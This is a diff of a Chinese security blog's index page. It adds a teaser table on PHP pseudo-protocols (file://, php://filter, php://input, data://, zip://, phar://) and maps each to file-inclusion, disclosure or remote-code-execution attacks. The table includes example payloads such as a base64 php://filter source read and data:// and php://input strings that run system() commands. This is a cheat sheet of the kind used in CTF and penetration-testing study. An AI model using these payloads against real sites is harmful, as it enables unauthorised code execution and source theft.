@@ -82,6 +82,135 @@
         <header class="article-info clearfix">
   <h1 itemprop="name">
     
+      <a href="/代码/2017/04/09/PHP伪协议.html" title="PHP伪协议" itemprop="url">PHP伪协议</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="Hello_C" target="_blank" itemprop="author">Hello_C</a>
+		
+  <p class="article-time">
+    <time datetime="2017-04-09T04:38:31.000Z" itemprop="datePublished"> 发表于 2017-04-09</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <h3 id="PHP协议-封装协议"><a href="#PHP协议-封装协议" class="headerlink" title="PHP协议/封装协议"></a>PHP协议/封装协议</h3><table>
+<thead>
+<tr>
+<th>包装或协议</th>
+<th style="text-align:center">控制能力</th>
+<th style="text-align:right">allow_url_include</th>
+<th style="text-align:right">漏洞类型</th>
+<th style="text-align:right">备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>file://</td>
+<td style="text-align:center">-</td>
+<td style="text-align:right">Off</td>
+<td style="text-align:right">LFI /文件操作</td>
+</tr>
+<tr>
+<td>glob://</td>
+<td style="text-align:center">-</td>
+<td style="text-align:right">Off</td>
+<td style="text-align:right">目录遍历</td>
+</tr>
+<tr>
+<td>php://filter/read</td>
+<td style="text-align:center">include</td>
+<td style="text-align:right">Off</td>
+<td style="text-align:right">文件泄露</td>
+<td style="text-align:right">PHP：//filter/read=convert.base64-encode/resource=index.php</td>
+</tr>
+<tr>
+<td>php://filter/write</td>
+<td style="text-align:center">file_put_contents</td>
+<td style="text-align:right">Off</td>
+<td style="text-align:right">编码</td>
+<td style="text-align:right">file_put_contents(“php://filter/write=string.rot13/resource=x.txt”,”content”);</td>
+</tr>
+<tr>
+<td>php://input</td>
+<td style="text-align:center">include</td>
+<td style="text-align:right">On</td>
+<td style="text-align:right">RCE</td>
+<td style="text-align:right">Encoding is required while reading .php source: &lt;?php echo base64_encode(file_get_contents(“solution.php”));?&gt; OR just use &lt;?php system(‘cat x.php’);?&gt;</td>
+</tr>
+<tr>
+<td>data://</td>
+<td style="text-align:center">include</td>
+<td style="text-align:right">On</td>
+<td style="text-align:right">RCE</td>
+<td style="text-align:right">data:text/plain,&lt;?php system(“id”)?&gt; OR data:text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpPz4=</td>
+</tr>
+<tr>
+<td>zip://</td>
+<td style="text-align:center">include + uploaded file</td>
+<td style="text-align:right">Off</td>
+<td style="text-align:right">RCE</td>
+</tr>
+<tr>
+<td>phar://</td>
+<td style="text-align:center">include + uploaded file</td>
+<td style="text-align:right">Off</td>
+<td style="text-align:right">RCE</td>
+<td style="text-align:right">PHP版本&gt; = 5.3</td>
+</tr>
+</tbody>
+</table>
+        
+        
+        <p class="article-more-link">
+          
+            <a href="/代码/2017/04/09/PHP伪协议.html#more">Read More</a>
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/代码/">代码</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/php/">php</a>
+  </div>
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+	  	<span></span>
+		<a href="/代码/2017/04/09/PHP伪协议.html#comments" class="ds-thread-count comments-count-link" data-thread-key="代码/2017/04/09/PHP伪协议.html" data-count-type="comments">&nbsp;</a>
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
       <a href="/测试/2017/04/03/PhpMyadmin分析（二）.html" title="PhpMyadmin分析（二）" itemprop="url">PhpMyadmin分析（二）</a>
   </h1>
   <p class="article-author">By
@@ -402,70 +531,6 @@
 
 
 
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/漏洞/2017/03/14/常见漏洞总结.html" title="常见漏洞总结" itemprop="url">常见漏洞总结</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="Hello_C" target="_blank" itemprop="author">Hello_C</a>
-		
-  <p class="article-time">
-    <time datetime="2017-03-14T12:00:08.000Z" itemprop="datePublished"> 发表于 2017-03-14</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <h3 id="0x01-安全配置错误"><a href="#0x01-安全配置错误" class="headerlink" title="0x01 安全配置错误"></a>0x01 安全配置错误</h3><h4 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h4><p>   好的安全需要对应用程序、框架、应用程序服务器、web服务器、数据库服务器和平台定义和执行安全配置。由于许多配置的默认值并不是安全的，因此，必须定义、实施和维护这些配置。这包含了对所有的软件保持及时的更新，包括所有应用程序的库文件。<br>   安全配置错误可以发生在一个应用程序堆栈的任何层面，包括平台、Web服务器、应用服务器、数据库、架构和自定义代码。攻击者通过访问默认账户、未使用的网页、未安装补丁的漏洞、未被保护的文件和目录等，以获得对系统未授权的访问。
-        
-        
-        <p class="article-more-link">
-          
-            <a href="/漏洞/2017/03/14/常见漏洞总结.html#more">Read More</a>
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-<div class="article-categories">
-  <span></span>
-  <a class="article-category-link" href="/categories/漏洞/">漏洞</a>
-</div>
-
-
-  <div class="article-tags">
-  
-  <span></span> <a href="/tags/渗透测试/">渗透测试</a>
-  </div>
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/漏洞/2017/03/14/常见漏洞总结.html#comments" class="ds-thread-count comments-count-link" data-thread-key="漏洞/2017/03/14/常见漏洞总结.html" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
 
   <nav id="page-nav" class="clearfix">
     <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/2/">Next<span></span></a>
@@ -498,7 +563,7 @@
 		  
 		
 		  
-			<li><a href="/categories/代码/" title="代码">代码<sup>9</sup></a></li>
+			<li><a href="/categories/代码/" title="代码">代码<sup>10</sup></a></li>
 		  
 		
 		  
@@ -539,15 +604,11 @@
 			
 		
 			
+				<li><a href="/tags/php/" title="php">php<sup>6</sup></a></li>
+			
+		
+			
 				<li><a href="/tags/writeup/" title="writeup">writeup<sup>6</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/php/" title="php">php<sup>5</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/CTF/" title="CTF">CTF<sup>4</sup></a></li>
 			
 		
 			
@@ -555,11 +616,15 @@
 			
 		
 			
-				<li><a href="/tags/代码审计/" title="代码审计">代码审计<sup>2</sup></a></li>
+				<li><a href="/tags/CTF/" title="CTF">CTF<sup>4</sup></a></li>
 			
 		
 			
 				<li><a href="/tags/sql注入/" title="sql注入">sql注入<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/web前端/" title="web前端">web前端<sup>2</sup></a></li>
 			
 		
 			
@@ -571,7 +636,7 @@
 			
 		
 			
-				<li><a href="/tags/web前端/" title="web前端">web前端<sup>2</sup></a></li>
+				<li><a href="/tags/代码审计/" title="代码审计">代码审计<sup>2</sup></a></li>
 			
 		
 			
